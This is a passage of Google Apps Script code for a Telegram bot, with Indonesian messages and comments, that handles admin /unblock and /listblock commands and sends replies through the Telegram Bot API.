      } else if (text.startsWith('/unblock ') && isAdmin(chatId)) {
        const target = text.substring('/unblock '.length).trim();
        if (!isNaN(parseInt(target))) {
          const targetUserId = parseInt(target);
          if (unblockUser(targetUserId)) {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> telah dibebaskan.`, 'HTML');
          } else {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> tidak ditemukan dalam daftar blokir.`, 'HTML');
          }
        } else if (replyToMessage) {
          const targetUserId = replyToMessage.from.id;
          if (unblockUser(targetUserId)) {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> (mereply pesan ini) telah dibebaskan.`, 'HTML');
          } else {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> (mereply pesan ini) tidak ditemukan dalam daftar blokir.`, 'HTML');
          }
        } else {
          sendMessage(chatId, 'Penggunaan perintah <code>/unblock</code> yang benar adalah dengan membalas pesan pengguna atau menggunakan <code>/unblock [ID Pengguna]</code>.', 'HTML');
        }
      } else if (text === '/listblock') {
        const blockedListMessage = getBlockedList(chatId);
        sendMessage(chatId, blockedListMessage, 'HTML');
      } else {
        // Tambahkan logika untuk perintah lain di sini jika diperlukan
        Logger.log(`Pesan dari ${chatId}: ${text}`);
      }     
    }
  }
  catch (error) {
    Logger.error('Error processing webhook:', error);
  }
}

function sendMessage(chatId, text, parseMode) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const data = {
    chat_id: chatId,
    text: text,
    parse_mode: parseMode // Tambahkan parameter parse_mode
  };
  const options = {
    method: 'post',
    contentType: 'application/json',
    payload: JSON.stringify(data)
  };
  UrlFetchApp.fetch(url, options);
}
